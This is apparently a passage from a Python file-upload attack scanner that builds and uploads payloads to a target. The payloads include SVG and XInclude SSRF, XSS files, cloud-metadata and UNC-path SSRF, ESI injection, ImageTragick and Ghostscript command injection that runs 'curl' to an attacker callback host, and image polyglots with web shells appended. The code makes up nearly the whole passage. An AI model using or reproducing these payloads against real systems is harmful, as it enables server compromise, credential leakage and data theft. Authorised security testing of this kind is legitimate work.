            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <text x="100" y="200" font-size="45" fill="red">\n'
            f'    <tref xlink:href="{url_tr}"/>\n'
            f'  </text>\n'
            f'</svg>'
        ).encode()),
        ("use_xlink_href", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <use xlink:href="{url_us}" width="64" height="64"/>\n'
            f'</svg>'
        ).encode()),
        ("xi_include", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude" width="200" height="200">\n'
            f'  <text x="10" y="10"><xi:include href="{url_xi}" parse="text"/></text>\n'
            f'</svg>'
        ).encode()),
        ("xml_stylesheet_pi", (
            f'<?xml version="1.0"?>\n'
            f'<?xml-stylesheet type="text/css" href="{url_xs}"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">\n'
            f'  <rect x="0" y="150" height="10" width="300" style="fill: black"/>\n'
            f'</svg>'
        ).encode()),
    ]

    variants = []
    for label, svg_bytes in payloads:
        for ext, mime in [("svg", "image/svg+xml"), ("svg", ""),
                          (allowed, "image/svg+xml"), (allowed, "")]:
            variants.append((ctx.rnd_name() + "." + ext, svg_bytes, mime or "image/svg+xml"))
    run_variants(ctx, variants, "svg_ssrf")


@module("swf_xss")
def mod_swf_xss(ctx: UploadContext):
    """SWF Flash XSS — upload .swf with embedded JavaScript (legacy browser attack).
    Also tests .htm/.html with XSS as UploadScanner HTML_TYPES module.
    Matches UploadScanner SWF_TYPES + HTML_TYPES.
    """
    info("swf_xss — SWF Flash XSS + HTML injection (UploadScanner SWF_TYPES/HTML_TYPES)")
    probe   = "UpMapSWF" + "".join(random.choices(string.digits, k=6))
    allowed = ctx.opts.allowed or "jpg"

    # Minimal SWF with ExternalInterface.call("alert","XSS") — base64-encoded per UploadScanner
    # This is a real 206-byte SWF compiled payload (CWS header = compressed)
    swf_b64 = (
        "Q1dTDmkGAAB4AWVU3VLbRhTe1dqW/2UDMeBAozQ0jgm2ZMMwgyGeUgwZbiATXyTDoPEs"
        "0gorkbUaScZmOpm+SSe96Wv0AXLjXrQP0KvO9KLuE6QriSBMNKOfPec7335nzzkag9hf"
        "AOR/BWAJgk5xGQDw0/wnCMCeo+mt150jcTwwLbfFVi8qfc+zW5I0Go3qo806dS6lxs7O"
        "jiQ3pWazxhA199ry8LhmuU8q7YCgQ1zVMWzPoJboE+ILOvReVCo3rJp6S2oPHTOg1FSJ"
        "mGRALM+VGvUGI9LUlk6dAfba2LZNQ8U+nTSuuX2qvh/hK1LTTez296QI6Md4hmeS9r5G"
        "L4h4ZJKxuCXuR/EBOoT4YC0S2r6TJvaj6yodSLZDtaHKNOmMKgi+G+JT2MML03D7xGk"
        "PrfcWHVkBKrL6GNUh2KOziC82329i63KIL0n78CSIvl0HGrFH2if0SmzIG2JTbjRDGb5"
        "1T/JP985p31hYAdsgXxgun5zWXu13u29OX3fARGBVnrk6hb/RHjjgPn/+fJZGzJVgdyz"
        "xy1mIyuCf/2mxnviUftvtvnLoO6J64LeFbAwAZgV3jAVQ90Oe3wUqB63zDlWHQUlFbGl"
        "il3ieYV265/vawLAM13P8Q2GrsFSsluIPQ8PUiCNu1bfPI/5z11F3d6N1HbvZaLUmJ7tE"
        "HTqGd50NOqLuXrseGcD1DDZNOurQATas4uHYI46FzWOLvXWsknwIJjf2uQF23D6LOByr"
        "JGhdV5Crux9Y36n9Z6T644fdmEOplzYpZhKPLZ2mbezgAWF8LvfOFSJJTOCa/PimoaJm"
        "2u9uSk1Z3pYuWJrsKBZCBZrh2ia+bnVtlgNZmzV2QufphX/6B5QNmmER59EsKMgJq55x"
        "RULgw1n/DMlK6CNX/qy1Dv2X7/fTJA4nSTGVHUL80HGoA0mcFUklD6LUpOgzN7NJIpSf"
        "CAUI93hvKhNumpvRU/xKfWnGf5v0Sq93SXse7amsbXoa0VkT+f+EXp+YNrKpixrbm4tf"
        "QPf9jcZWMQ5LiRJXSseLi1xybgmWYXm+vFB+UC6VF0vflL7lchDF4gk+mUpnsrn8As/F"
        "eZTkYykeZXiU41GeR0KqAHm0zKMyjx7yaIVHkBce8UjkC4954QkvrPHCd2yYODYQq+zB"
        "Ae4prDyrwso6zOVTyWB2IAdzHch8EAEIkyk0kV+yqUIoLfT/Q9PkRH6z/of8L4yB5DQ1"
        "OQbTtAJ1uMEfcbA6zShIR09xbJr3PzaySlyP6wmd15MfN5Y+HqUYRCisADCRf5fPwPqf"
        "6/LzAZwWlCzhTHiUhdXVJDedewmrB8fpDOA4JmBnIrNtEwQogi7ISkEvyEpRL8rKnD4n"
        "K/P6vKzk9XzweAtWg6ufYxFxplqYv/c3+J5l/j9Txem0"
    )
    try:
        swf_bytes = base64.b64decode(swf_b64)
    except ValueError:  # binascii.Error is a subclass of ValueError
        swf_bytes = b"CWS" + b"\x00" * 20  # fallback minimal SWF header

    # HTML payloads (UploadScanner HTML_TYPES — .htm, .html, .xhtml)
    html_payloads = [
        f'<html><head></head><body><script>alert("{probe}")</script></body></html>'.encode(),
        f'<script>alert("{probe}")</script>'.encode(),
        f'<img src=x onerror=alert("{probe}")>'.encode(),
    ]

    variants = []
    # SWF variants
    for ext, mime in [("swf", "application/x-shockwave-flash"), ("swf", ""),
                      (allowed, "application/x-shockwave-flash"), (allowed, "")]:
        variants.append((ctx.rnd_name() + "." + ext, swf_bytes, mime or "application/x-shockwave-flash"))
    # HTML variants
    for payload in html_payloads:
        for ext in ["htm", "html", "xhtml"]:
            for mime in ["text/html", "text/plain", ""]:
                variants.append((ctx.rnd_name() + "." + ext, payload, mime or "text/html"))
    run_variants(ctx, variants, "swf_xss")


# ─────────────────────────────────────────────────────────────────────────────
# SSRF
# ─────────────────────────────────────────────────────────────────────────────

@module("ssrf_url")
def mod_ssrf_url(ctx: UploadContext):
    """SSRF via URL/protocol injection in upload content or filename."""
    info("ssrf_url — SSRF via URL/protocol injection in file content")
    oast   = ctx.opts.oast or "http://oast.example.com"
    probe  = "UpMapSSRF" + "".join(random.choices(string.digits, k=6))

    ssrf_urls = [
        f"{oast}/{probe}",
        f"http://169.254.169.254/latest/meta-data/",
        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        f"http://metadata.google.internal/computeMetadata/v1/",
        f"file://{_lfi(ctx, '/etc/passwd')}",
        f"dict://127.0.0.1:6379/INFO",
        f"gopher://127.0.0.1:6379/_QUIT%0a",
        f"http://localhost:22",
        f"http://127.0.0.1:8080/",
    ]

    variants = []
    for url_str in ssrf_urls:
        payload = url_str.encode()
        for ext in ["txt", "url", "ini", ctx.opts.allowed or "jpg"]:
            for mime in ["text/plain", ""]:
                variants.append((ctx.rnd_name() + "." + ext, payload, mime or "text/plain"))
    run_variants(ctx, variants, "ssrf_url")


@module("url_file_ssrf")
def mod_url_file_ssrf(ctx: UploadContext):
    """Windows .URL / .ini file SSRF — IconResource / UNC path triggers SMB callback.
    Matches UploadScanner URL_TYPES + INI_TYPES.
    """
    info("url_file_ssrf — .URL / .ini / desktop.ini UNC SSRF (Windows SMB/HTTP)")
    oast    = ctx.opts.oast or "http://oast.example.com"
    probe   = "UpMapURL" + "".join(random.choices(string.digits, k=6))
    allowed = ctx.opts.allowed or "jpg"
    # UNC path forces SMB auth to OAST — use raw host
    oast_host = oast.replace("https://","").replace("http://","").split("/")[0]

    # Windows .URL file (Internet Shortcut) — loads icon via UNC
    url_content = (
        f"[InternetShortcut]\n"
        f"URL={oast}/{probe}\n"
        f"IconFile=\\\\{oast_host}\\{probe}\\icon.ico\n"
        f"IconIndex=1\n"
    ).encode()

    # Windows .ini / desktop.ini — loads icon via UNC
    ini_content = (
        f"[.ShellClassInfo]\n"
        f"IconResource=\\\\{oast_host}\\{probe}\\icon.ico,0\n"
    ).encode()

    # AutoRun.inf (USB/share SSRF)
    autorun_content = (
        f"[AutoRun]\n"
        f"open=\\\\{oast_host}\\{probe}\\launch.exe\n"
        f"icon=\\\\{oast_host}\\{probe}\\icon.ico\n"
    ).encode()

    variants = []
    for payload, filename_base, exts, mimes in [
        (url_content,     "link",       ["URL", "url"],              ["", "application/octet-stream"]),
        (ini_content,     "desktop",    ["ini"],                     ["", "text/plain"]),
        (autorun_content, "AutoRun",    ["inf"],                     ["", "text/plain"]),
        (url_content,     "link",       [allowed],                   [""]),
        (ini_content,     "config",     [allowed],                   [""]),
    ]:
        for ext in exts:
            for mime in mimes:
                variants.append((ctx.rnd_name() + "." + ext, payload, mime or "text/plain"))
    run_variants(ctx, variants, "url_file_ssrf")


# ─────────────────────────────────────────────────────────────────────────────
# ESI
# ─────────────────────────────────────────────────────────────────────────────

@module("esi_injection")
def mod_esi_injection(ctx: UploadContext):
    """Edge Side Include injection — Squid/Varnish/Nginx ESI processing.
    Includes UploadScanner's passive detection trick: inject split random string,
    if <!--esi--> is silently stripped the two halves concatenate in the response.
    """
    info("esi_injection — ESI passive detect (split-string) + OAST + SSRF + LFI")
    oast    = ctx.opts.oast or "http://oast.example.com"
    probe   = "UpMapESI" + "".join(random.choices(string.digits, k=6))
    allowed = ctx.opts.allowed or "jpg"

    # Passive detection: random string split by <!--esi--> comment
    # If ESI is processed, <!--esi--> is stripped and the two halves join
    rand_a = "".join(random.choices(string.ascii_letters, k=5))
    rand_b = "".join(random.choices(string.ascii_letters, k=5))
    rand_c = "".join(random.choices(string.ascii_letters, k=5))
    passive_expect = rand_a + rand_b           # <!--esi--> stripped → concatenated
    passive_payload = f"{rand_a}<!--esi-->{rand_b}<!--esx-->{rand_c}".encode()

    payloads = [
        # Passive detection (no OAST needed)
        passive_payload,
        # OAST via esi:include
        f'<esi:include src="{oast}/esi/{probe}" alt="{oast}/esi/{probe}" onerror="continue"/>'.encode(),
        f'<esi:include src="{oast}/esi/{probe}"/>'.encode(),
        # SSRF targets
        b'<esi:include src="http://169.254.169.254/latest/meta-data/"/>',
        b'<esi:include src="http://metadata.google.internal/computeMetadata/v1/"/>',
        f'<esi:include src="file://{_lfi(ctx, "/etc/passwd")}"/>'.encode(),
        # Error-based injection
        b'<esi:vars/>',
        b'<esi:remove>should be removed</esi:remove>kept content',
    ]

    variants = []
    for p in payloads:
        for ext in ["txt", "html", allowed]:
            for mime in ["text/plain", "text/html", ""]:
                variants.append((ctx.rnd_name() + "." + ext, p, mime or "text/plain"))
    run_variants(ctx, variants, "esi_injection")


# ─────────────────────────────────────────────────────────────────────────────
# Image / Media CVEs
# ─────────────────────────────────────────────────────────────────────────────

@module("imagetragick_sleep")
def mod_imagetragick_sleep(ctx: UploadContext):
    """CVE-2016-3714 ImageMagick — sleep/ping-based time detection.
    Sends 3 sleep durations × 4 payload formats (MVG pipe, MVG fill-url, SVG xlink, GS EPS).
    """
    info("imagetragick_sleep — CVE-2016-3714 time-based (3 durations × 4 formats)")

    sleep_payloads = []
    for secs in [5, 10, 15]:
        cmd_linux = f"sleep {secs}"
        cmd_win   = f"timeout /T {secs}"
        for cmd in [cmd_linux, cmd_win]:
            # MVG pipe format: image Over '|cmd' (most reliable)
            mvg_pipe = (
                f"push graphic-context\n"
                f"viewbox 0 0 640 480\n"
                f"fill 'url(https://127.0.0.1/\"|{cmd}\")'\n"
                f"pop graphic-context\n"
            ).encode()
            # MVG image Over format
            mvg_image = (
                f"push graphic-context\n"
                f"encoding \"UTF-8\"\n"
                f"viewbox 0 0 1 1\n"
                f"image Over 0,0 1,1 'https://127.0.0.1/tmp.png`{cmd}`'\n"
                f"pop graphic-context\n"
            ).encode()
            # SVG xlink:href with backtick injection (CVE-2016-3714 SVG vector)
            svg_bt = (
                '<?xml version="1.0" standalone="no"?>'
                '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
                '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
                '<svg width="640px" height="480px" version="1.1" '
                'xmlns="http://www.w3.org/2000/svg" '
                'xmlns:xlink="http://www.w3.org/1999/xlink">'
                f'<image xlink:href="https://127.0.0.1/image.jpg`{cmd}`" '
                'x="0" y="0" height="480px" width="640px"/>'
                '</svg>'
            ).encode()
            # Ghostscript EPS sleep
            gs_sleep = (
                f"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n"
                f"({cmd}) runlength\n"
            ).encode()

            allowed = ctx.opts.allowed or "jpg"
            for payload, ext, mime in [
                (mvg_pipe,  "mvg",    ""),
                (mvg_pipe,  "mvg",    "image/svg+xml"),
                (mvg_pipe,  allowed,  ""),
                (mvg_image, "mvg",    "image/png"),
                (svg_bt,    "svg",    "image/svg+xml"),
                (svg_bt,    allowed,  "image/svg+xml"),
                (gs_sleep,  "eps",    ""),
                (gs_sleep,  allowed,  ""),
            ]:
                sleep_payloads.append((ctx.rnd_name() + "." + ext, payload, mime or "image/png", secs))

    for filename, content, mime, expected_secs in sleep_payloads:
        if ctx._should_abort():
            return
        start   = time.time()
        resp    = ctx.send(filename, content, mime)
        elapsed = time.time() - start
        ctx.output.tick(f"{filename} | elapsed={elapsed:.1f}s (expected>={expected_secs}s)")
        ctx.dump_response(resp)
        if ctx.is_success(resp) and elapsed >= expected_secs - 2:
            ctx.output.record("imagetragick_sleep", filename, mime, False, "",
                              f"CVE-2016-3714 likely — response delayed {elapsed:.1f}s (sleep={expected_secs}s)",
                              response=resp)
            if not ctx.opts.brute_force:
                ctx.stop_flag.set()
                return


@module("imagetragick_oast")
def mod_imagetragick_oast(ctx: UploadContext):
    """CVE-2016-3714/3718/CVE-2018-16323 — SSRF via OAST callback URL.
    6 distinct payload vectors matching UploadScanner IM_SVG_TYPES + IM_MVG_TYPES.
    """
    info("imagetragick_oast — CVE-2016-3714/3718/2018-16323 SSRF (6 vectors)")
    if not ctx.opts.oast:
        warn("imagetragick_oast skipped — provide --oast URL")
        return

    oast    = ctx.opts.oast.rstrip("/")
    probe   = "UpMapIM" + "".join(random.choices(string.digits, k=6))
    cb_url  = f"{oast}/{probe}"
    allowed = ctx.opts.allowed or "jpg"

    payloads = [
        # 1. CVE-2016-3718: MVG image Over (SSRF via HTTP fetch)
        (
            f"push graphic-context\nencoding \"UTF-8\"\nviewbox 0 0 1 1\n"
            f"image Over 0,0 1,1 '{cb_url}'\n"
            f"pop graphic-context\n"
        ).encode(),

        # 2. MVG fill url() (alternative SSRF trigger)
        (
            f"push graphic-context\nviewbox 0 0 640 480\n"
            f"fill 'url({cb_url})'\n"
            f"pop graphic-context\n"
        ).encode(),

        # 3. MVG delegate command injection (CVE-2016-3714 RCE): break out of the
        #    fetch URL with a quote and pipe a shell command. A callback here proves
        #    RCE, not just SSRF — genuinely distinct from #2's plain URL fetch.
        (
            "push graphic-context\nviewbox 0 0 640 480\n"
            "fill 'url(https://127.0.0.1/x.jpg\"|curl " + cb_url + "\")'\n"
            "pop graphic-context\n"
        ).encode(),

        # 4. SVG xlink:href full (CVE-2016-3714 SVG vector)
        (
            '<?xml version="1.0" standalone="no"?>'
            '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
            '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
            '<svg width="640px" height="480px" version="1.1" '
            'xmlns="http://www.w3.org/2000/svg" '
            'xmlns:xlink="http://www.w3.org/1999/xlink">'
            f'<image xlink:href="{cb_url}" x="0" y="0" height="480px" width="640px"/>'
            '</svg>'
        ).encode(),

        # 5. MSL XML (Magick Scripting Language — CVE-2016-3714 alternative)
        (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<image>\n  <read filename="{cb_url}"/>\n</image>\n'
        ).encode(),

        # 6. CVE-2018-16323 XBM SSRF
        (
            f"#define UpMap_width 1\n#define UpMap_height 1\n"
            f"static char UpMap_bits[] = {{ 0x00 }};\n"
            f"/* {cb_url} */\n"
        ).encode(),
    ]

    type_combos = [
        ("mvg",    ""),
        ("mvg",    "image/svg+xml"),
        ("mvg",    "image/png"),
        ("svg",    "image/svg+xml"),
        ("svg",    ""),
        (allowed,  ""),
        (allowed,  "image/png"),
        ("xbm",    ""),
        ("xbm",    "image/x-xbm"),
        ("xbm",    "image/png"),
    ]

    variants = []
    for p in payloads:
        for ext, mime in type_combos:
            variants.append((ctx.rnd_name() + "." + ext, p, mime or "image/png"))
    run_variants(ctx, variants, "imagetragick_oast")


def _make_xbm_overflow(width: int = 3000, height: int = 3000, bytes_per_line: int = 12) -> bytes:
    """Generate XBM with 0x80000001 overflow value (GraphicsMagick CVE PoC)."""
    lines = [
        f"#define upmap_width {width}",
        f"#define upmap_height {height}",
        "static char upmap_bits[] = {",
        "  0x80000001, ",   # the overflow-triggering value from original PoC
    ]
    total_bytes = (width * height) // 8 - bytes_per_line
    while total_bytes > 0:
        chunk = min(bytes_per_line, total_bytes)
        lines.append("  " + "0x00, " * chunk)
        total_bytes -= chunk
    lines.append("};")
    return "\n".join(lines).encode()


@module("imagemagick_mvg")
def mod_imagemagick_mvg(ctx: UploadContext):
    """ImageMagick/GraphicsMagick RCE via MVG pipe injection and XBM overflow.
    Covers: MVG pipe '|cmd', fill url() RCE, XBM 0x80000001 integer overflow.
    """
    info("imagemagick_mvg — MVG pipe RCE + XBM integer overflow (GraphicsMagick)")
    oast    = ctx.opts.oast or "http://oast.example.com"
    probe   = "UpMapMVG" + "".join(random.choices(string.digits, k=6))
    allowed = ctx.opts.allowed or "jpg"

    # MVG pipe injection: '|cmd' executed by ImageMagick convert
    mvg_pipe = (
        f"push graphic-context\n"
        f"viewbox 0 0 640 480\n"
        f"fill 'url(https://127.0.0.1/\"|curl {oast}/{probe}\")'\n"
        f"pop graphic-context\n"
    ).encode()

    # MVG image Over with pipe
    mvg_image_pipe = (
        f"push graphic-context\n"
        f"viewbox 0 0 640 480\n"
        f"image Over 0,0 0,0 '|curl {oast}/{probe}'\n"
        f"pop graphic-context\n"
    ).encode()

    # XBM overflow (triggers integer overflow in GraphicsMagick)
    xbm_overflow = _make_xbm_overflow()

    # XBM with URL-loading pattern
    xbm_url = (
        f"#define upmap_width 1\n#define upmap_height 1\n"
        f"static char upmap_bits[] = {{ 0x00 }};\n"
        f"/* {oast}/{probe} */\n"
    ).encode()

    variants = []
    # MVG payloads
    for payload in [mvg_pipe, mvg_image_pipe]:
        for ext, mime in [("mvg", ""), ("mvg", "image/svg+xml"),
                          ("mvg", "image/png"), (allowed, ""), (allowed, "image/png")]:
            variants.append((ctx.rnd_name() + "." + ext, payload, mime or "image/png"))
    # XBM payloads
    for payload in [xbm_overflow, xbm_url]:
        for ext, mime in [("xbm", ""), ("xbm", "image/x-xbm"), ("xbm", "image/png"),
                          (allowed, ""), (allowed, "image/x-xbm")]:
            variants.append((ctx.rnd_name() + "." + ext, payload, mime or "image/png"))
    run_variants(ctx, variants, "imagemagick_mvg")


@module("ghostscript")
def mod_ghostscript(ctx: UploadContext):
    """Ghostscript RCE/SSRF/LFI via EPS/GS/PS files.
    Payloads:
      1. CVE-2016-7977 — .libfile to read /etc/passwd and render as image
      2. SSRF via (url) (r) file
      3. RCE via userdict /setPageDevice undef + system call
      4. GS type confusion RCE
    """
    info("ghostscript — CVE-2016-7977 LFI + SSRF + RCE (4 payload types)")
    oast    = ctx.opts.oast or "http://oast.example.com"
    probe   = "UpMapGS" + "".join(random.choices(string.digits, k=6))
    allowed = ctx.opts.allowed or "jpg"

    # 1. CVE-2016-7977: .libfile reads /etc/passwd line by line into image
    ps_lfi = (
        "%!PS\n"
        "/Size 20 def\n"
        "/Line 0 def\n"
        "/Buf 1024 string def\n"
        "/Path 0 newpath def\n"
        "/Courier-Bold findfont Size scalefont setfont\n"
        "1 1 1 setrgbcolor clippath fill\n"
        "0 0 0 setrgbcolor\n"
        f"({_lfi(ctx, '/etc/passwd')}) .libfile {{\n"
        "  {\n"
        "    dup Buf readline\n"
        "    {\n"
        "      Path Line moveto show\n"
        "    }{\n"
        "      showpage quit\n"
        "    } ifelse\n"
        "    /Line Line Size add def\n"
        "  } loop\n"
        "} if\n"
    ).encode()

    # 2. SSRF via (url) (r) file
    ps_ssrf = (
        f"%!PS-Adobe-3.0\n"
        f"({oast}/{probe}) (r) file\n"
        f"statusdict begin\n"
        f"({oast}/{probe}) = flush\n"
    ).encode()

    # 3. RCE via userdict setPageDevice undef + exec
    ps_rce = (
        f"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n"
        f"userdict /setPageDevice undef\n"
        f"<<\n/HWResolution [72 72]\n/PageSize [595 842]\n>> setpagedevice\n"
        f"(curl {oast}/{probe}) runlength\n"
    ).encode()

    # 4. GS type confusion / unsafe restore RCE (CVE-2018-16509 style)
    ps_type_confusion = (
        "%!PS\n"
        "{ null restore } stopped { pop } if\n"
        "{ legal } stopped { pop } if\n"
        "mark /OutputFile (%pipe%"
        f"curl {oast}/{probe}"
        ") currentdevice putdeviceprops\n"
    ).encode()

    variants = []
    for payload in [ps_lfi, ps_ssrf, ps_rce, ps_type_confusion]:
        for ext, mime in [
            ("eps",   ""),
            ("eps",   "text/plain"),
            ("gs",    ""),
            ("ps",    ""),
            ("pdf",   "application/pdf"),
            ("jpeg",  "image/jpeg"),
            ("png",   "image/png"),
            (allowed, ""),
            (allowed, "image/jpeg"),
        ]:
            variants.append((ctx.rnd_name() + "." + ext, payload, mime or "image/jpeg"))
    run_variants(ctx, variants, "ghostscript")


@module("libavformat_ssrf")
def mod_libavformat_ssrf(ctx: UploadContext):
    """LibAVFormat SSRF via M3U playlist and AVI-wrapped M3U.
    Uses the real AVI header structure from UploadScanner (ported from AviM3uXbin class).
    Triggers server-side SSRF when FFmpeg/libavformat processes uploaded media files.
    """
    info("libavformat_ssrf — M3U/AVI SSRF via FFmpeg/libavformat (real AVI header)")
    oast    = ctx.opts.oast or "http://oast.example.com"
    probe   = "UpMapAV" + "".join(random.choices(string.digits, k=6))
    cb_url  = f"{oast}/{probe}"
    allowed = ctx.opts.allowed or "jpg"

    # M3U HLS playlist variants
    m3u_basic = (
        f"#EXTM3U\n"
        f"#EXT-X-MEDIA-SEQUENCE:0\n"
        f"#EXTINF:10.0,\n"
        f"{cb_url}\n"
        f"#EXT-X-ENDLIST\n"
    ).encode()

    m3u_key = (
        f"#EXTM3U\n"
        f"#EXT-X-MEDIA-SEQUENCE:0\n"
        f"#EXT-X-KEY: METHOD=AES-128,URI=\"{cb_url}\",IV=0x00000000000000000000000000000000\n"
        f"#EXTINF:10.0,\n"
        f"/dev/zero\n"
        f"#EXT-X-BYTERANGE:16\n"
        f"#EXT-X-ENDLIST\n"
    ).encode()

    # Real AVI header from UploadScanner AviM3uXbin class
    AVI_HEADER = (
        b"RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00"
        b"\x40\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00"
        b"\x7d\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00"
        b"\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\x00\x00LIST\x74\x00\x00\x00strlstrh"
        b"8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00"
        b"\x00\x7d\x00\x00\x00\x86\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf\x28\x00\x00\x00\x28\x00"
        b"\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID"
        b"\x00\x48\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00LIST    movi"
    )
    avi_m3u = AVI_HEADER + m3u_basic

    variants = []
    for payload, ext, mime in [
        (m3u_basic, "m3u8",   "audio/mpegurl"),
        (m3u_basic, "m3u8",   "application/mpegurl"),
        (m3u_basic, "m3u8",   "application/x-mpegurl"),
        (m3u_basic, allowed,  "audio/mpegurl"),
        (m3u_basic, allowed,  "video/x-msvideo"),
        (m3u_basic, allowed,  ""),
        (m3u_key,   "m3u8",   "audio/mpegurl"),
        (m3u_key,   allowed,  "audio/mpegurl"),
        (avi_m3u,   "avi",    "video/x-msvideo"),
        (avi_m3u,   "avi",    ""),
        (avi_m3u,   allowed,  "video/x-msvideo"),
        (avi_m3u,   allowed,  ""),
    ]:
        variants.append((ctx.rnd_name() + "." + ext, payload, mime or "audio/mpegurl"))
    run_variants(ctx, variants, "libavformat_ssrf")


@module("polyglot_image_rce")
def mod_polyglot_image_rce(ctx: UploadContext):
    """PIL-based real polyglot: genuine pixel-valid images with appended shell.

    Unlike polyglot_php_jpeg (magic bytes only), this module creates images that
    pass strict validation checks (PHP getimagesize(), ImageMagick identify,
    PIL Image.open()) because the image header, dimensions, and IDAT chunks are
    fully valid — the shell is appended AFTER the image data.

    Source: file_bypasser.py / advance_file.py from Advance-file-upload-bypasser

    Falls back to magic-byte-only polyglot if PIL (Pillow) is not installed.
    """
    info("polyglot_image_rce — PIL real pixel-valid polyglot (+ magic-bytes fallback)")
    ext   = ctx.opts.extension
    shell = SHELLS.get(ext, SHELLS["php"])

    def _make_minimal_png(width: int = 8, height: int = 8) -> bytes:
        """Build a minimal valid 8x8 PNG using struct (no PIL needed)."""
        import struct, zlib
        header = b"\x89PNG\r\n\x1a\n"
        def chunk(tag: bytes, data: bytes) -> bytes:
            crc = struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
            return struct.pack(">I", len(data)) + tag + data + crc
        ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
        # 8x8 white RGB image, one filter byte (0x00) per scanline
        raw  = b"\x00" + b"\xff\xff\xff" * width
        idat = chunk(b"IDAT", zlib.compress(raw * height))
        return header + chunk(b"IHDR", ihdr_data) + idat + chunk(b"IEND", b"")

    def _make_minimal_gif() -> bytes:
        """Build a minimal valid 1x1 GIF89a."""
        return (
            b"GIF89a\x01\x00\x01\x00\x80\x01\x00\xff\xff\xff\x00\x00\x00"
            b"!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
            b"\x00\x00\x02\x02D\x01\x00;"
        )

    def _make_minimal_jpeg() -> bytes:
        """Build a minimal valid JPEG using SOI + minimal APP0 + SOS markers."""
        # Minimal valid JPEG that passes most validators (JFIF compliant)
        return (
            b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08"
            b"\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e"
            b"\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\x1eC"
            b"\xff\xc0\x00\x0b\x08\x00\x08\x00\x08\x01\x01\x11\x00\xff\xc4\x00"
            b"\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xda\x00"
            b"\x08\x01\x01\x00\x00?\x00\xfb\xdf\xff\xd9"
        )

    # Try PIL for truly valid images (optional dependency)
    try:
        from PIL import Image as _PIL_Image
        def make_pil_image(fmt: str) -> bytes:
            img  = _PIL_Image.new("RGB", (64, 64),
                                  tuple(random.randint(0, 255) for _ in range(3)))
            for _ in range(20):
                img.putpixel(
                    (random.randint(0, 63), random.randint(0, 63)),
                    tuple(random.randint(0, 255) for _ in range(3))
                )
            buf = io.BytesIO()
            img.save(buf, format=fmt)
            return buf.getvalue()
        jpeg_data = make_pil_image("JPEG")
        png_data  = make_pil_image("PNG")
        gif_data  = make_pil_image("GIF")
        bmp_data  = make_pil_image("BMP")
        success("polyglot_image_rce — PIL/Pillow available: real pixel-valid images")
    except ImportError:
        # Fallback: hand-crafted minimal valid images (no PIL required)
        jpeg_data = _make_minimal_jpeg()
        png_data  = _make_minimal_png()
        gif_data  = _make_minimal_gif()
        bmp_data  = MAGIC.get("bmp", b"BM") + b"\x00" * 54
        warn("polyglot_image_rce — PIL not installed; using minimal-header fallback")

    image_bases = [
        (jpeg_data, "jpg",  "image/jpeg"),
        (png_data,  "png",  "image/png"),
        (gif_data,  "gif",  "image/gif"),
        (bmp_data,  "bmp",  "image/bmp"),
    ]

    exts = EXTENSIONS.get(ext, [ext])
    variants = []
    for img_bytes, img_ext, img_mime in image_bases:
        payload = img_bytes + shell
        for mal_ext in exts[:4]:
            base = ctx.rnd_name()
            # Upload as image extension with image MIME (most permissive bypass)
            variants.append((f"{base}.{img_ext}", payload, img_mime))
            # Upload as malicious extension with image MIME
            variants.append((f"{base}.{mal_ext}", payload, img_mime))
            # Double extension: real image extension over malicious
            variants.append((f"{base}.{mal_ext}.{img_ext}", payload, img_mime))
            # With actual malicious MIME (less likely to pass)
            variants.append((f"{base}.{img_ext}", payload, "application/x-httpd-php"))

    run_variants(ctx, variants, "polyglot_image_rce")


# ─────────────────────────────────────────────────────────────────────────────
# PDF
# ─────────────────────────────────────────────────────────────────────────────

@module("pdf_exploit")
def mod_pdf_exploit(ctx: UploadContext):
    """PDF JavaScript execution (corkami multi-action) + SSRF via PDF URI + Ghostscript PDF.
